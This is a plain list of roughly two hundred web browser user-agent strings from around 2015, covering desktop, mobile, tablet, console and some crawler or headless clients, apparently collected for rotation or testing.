Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Linux; U; Android 4.0.3; en-us; KFOT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 6_1_3 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10B329 Safari/8536.25
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_0_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A405 Safari/600.1.4
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.77.4 (KHTML, like Gecko) Version/7.0.5 Safari/537.77.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 10.0; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAGWJS; rv:11.0) like Gecko
Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.5.17 (KHTML, like Gecko) Version/7.1.5 Safari/537.85.14
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP06; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/600.4.8 (KHTML, like Gecko) Version/8.0.3 Safari/600.4.8
Mozilla/5.0 (iPad; CPU OS 7_0_6 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B651 Safari/9537.53
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.3.18 (KHTML, like Gecko) Version/7.1.3 Safari/537.85.12
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/27.0.1453 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321
Mozilla/5.0 (iPad; CPU OS 7_0_3 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11B511 Safari/9537.53
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.1.17 (KHTML, like Gecko) Version/7.1 Safari/537.85.10
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/7.1.2 Safari/537.85.11
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; ASU2JS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36
Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.1) Gecko/2008070208 Firefox/3.0.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) Qt/4.8.5 Safari/534.34
Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 BingPreview/1.0b
Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (X11; CrOS x86_64 7262.52.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.86 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.63 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.4.10 (KHTML, like Gecko) Version/7.1.4 Safari/537.85.13
Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/538.1 (KHTML, like Gecko) PhantomJS/2.0.0 Safari/538.1
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Android; Tablet; rv:40.0) Gecko/40.0 Firefox/40.0
Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D257 Safari/9537.53
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10) AppleWebKit/600.2.5 (KHTML, like Gecko) Version/8.0.2 Safari/600.2.5
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/536.30.1 (KHTML, like Gecko) Version/6.0.5 Safari/536.30.1
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MAAU; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.74.9 (KHTML, like Gecko) Version/7.0.2 Safari/537.74.9
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_0_2 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A501 Safari/9537.53
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53
Mozilla/5.0 (Windows NT 10.0; Trident/7.0; rv:11.0) like Gecko
Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12F69 Safari/600.1.4
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.78.2 (KHTML, like Gecko) Version/7.0.6 Safari/537.78.2
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MASMJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; FunWebProducts; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUS; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 4.4.2; SM-T230NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSWOL; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 5.1; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Linux; U; Android 4.0.4; en-us; KFJWA Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B440 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie9; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.0.2; SM-T530NU Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 9_0 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13A4325c Safari/601.1
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12B466 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.89 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0)
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (iPhone; CPU iPhone OS 8_2 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12D508 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/44.0.2403.67 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; WOW64; Trident/7.0; .NET4.0E; .NET4.0C)
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36
Mozilla/5.0 (PlayStation 4 2.57) AppleWebKit/537.73 (KHTML, like Gecko)
Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (Linux; Android 5.0; SM-G900V Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36
Mozilla/5.0 (X11; Linux x86_64; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Linux; Android 5.1.1; Nexus 7 Build/LMY48I) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; LCJB; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)
Mozilla/5.0 (Linux; Android 5.0.2; SM-T800 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.111 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/537.75.14
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; ASJB; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0.1; SAMSUNG SCH-I545 4G Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36
Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.114 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; EIE10;ENUSMSN; rv:11.0) like Gecko
Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) CriOS/45.0.2454.68 Mobile/12H321 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MATBJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:30.0) Gecko/20100101 Firefox/30.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MASAJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MALC; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24
Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.120 Safari/537.36
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; yie10; rv:11.0) like Gecko
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG-SM-G900A Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Linux; U; Android 4.0.3; en-gb; KFTT Build/IML74K) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/8.0)
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; TNJB; rv:11.0) like Gecko
Mozilla/5.0 (X11; CrOS x86_64 7077.111.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36
Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; rv:37.0) Gecko/20100101 Firefox/37.0
Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER
Mozilla/5.0 (Windows NT 6.3; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36
Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-G900P Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36
Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.18.US Safari/537.36
Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3; GWX:QUALIFIED)
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.104 AOL/9.8 AOLBuild/4346.13.US Safari/537.36
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36
Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:23.0) Gecko/20100101 Firefox/23.0
Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/44.0.2403.89 Chrome/44.0.2403.89 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A523 Safari/8536.25
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MANM; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36
Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/8.0.57838 Mobile/12H143 Safari/600.1.4
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:32.0) Gecko/20100101 Firefox/32.0
Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; MDDRJS)
Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.22 Safari/537.36
Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0
Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MATBJS; rv:11.0) like Gecko
